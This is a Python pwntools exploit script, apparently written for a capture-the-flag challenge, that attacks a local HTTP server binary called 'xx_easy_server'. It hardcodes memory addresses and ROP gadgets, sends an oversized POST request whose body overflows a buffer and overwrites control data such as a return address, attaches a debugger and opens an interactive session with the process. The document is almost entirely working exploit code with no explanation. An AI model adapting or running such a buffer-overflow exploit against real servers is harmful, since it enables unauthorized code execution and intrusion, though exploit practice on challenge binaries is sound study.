from pwn import *
import time

p = process("./xx_easy_server")
elf = ELF("./xx_easy_server")
context.log_level = "debug"

# addrs
bss = 0x804c020
entry = 0x80491eb
do_file = 0x8049153
data_do_file = 0x804C4D0
bss_stdin = 0x804C68C
bss_stdout = 0x804C690
csu_gadget_1 = 0x8049A85
func_printf = 0x8048b06
fmt_s = 0x8049D9B
strncpy = 0x80488c0

# gadgets
pp_ret = 0x08049a8a
add_ebp_ebx = 0x0804a284
fix_ebp = 0x08048ad4
#0x08048ad4 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret

get = '''GET /test.html?a=123 HTTP/1.1
Host: 127.0.0.1:2333
Authorization: Basic RWFzeSBBdXRo

'''

payload = p32(bss)*(0xea68//4) + p32(0xffffffff) # pass "mov xxx, 0x3f"
payload = payload.ljust(0xea9c, b"B")
payload += p32(0x0804c4d8)  # pass "call eax"
payload = payload.ljust(0xeab4, b"C")

payload += p32(0x80488c0) #ret addr

req = "POST /{}/ HTTP/1.1\nHost: 127.0.0.1:2333\nContent-Length: {}\n\n".format("A"*0x2700, len(payload))

def exp():
    #print("SEND REQ:\n", req)
    #gdb.attach(p, "b *0x8049238\nc\n") #first fgets
    gdb.attach(p, "b *0x804994e\nb *0x80499D7\nb *0x804a2f2\nc\n") #fread, call eax, jmp ecx
    #gdb.attach(p, "b *0x8049167\nc\n") #fopen

    p.send(req.encode())
    p.send(payload)
    p.shutdown(direction = "send")
    
    p.interactive()

if __name__ == "__main__":
    exp()
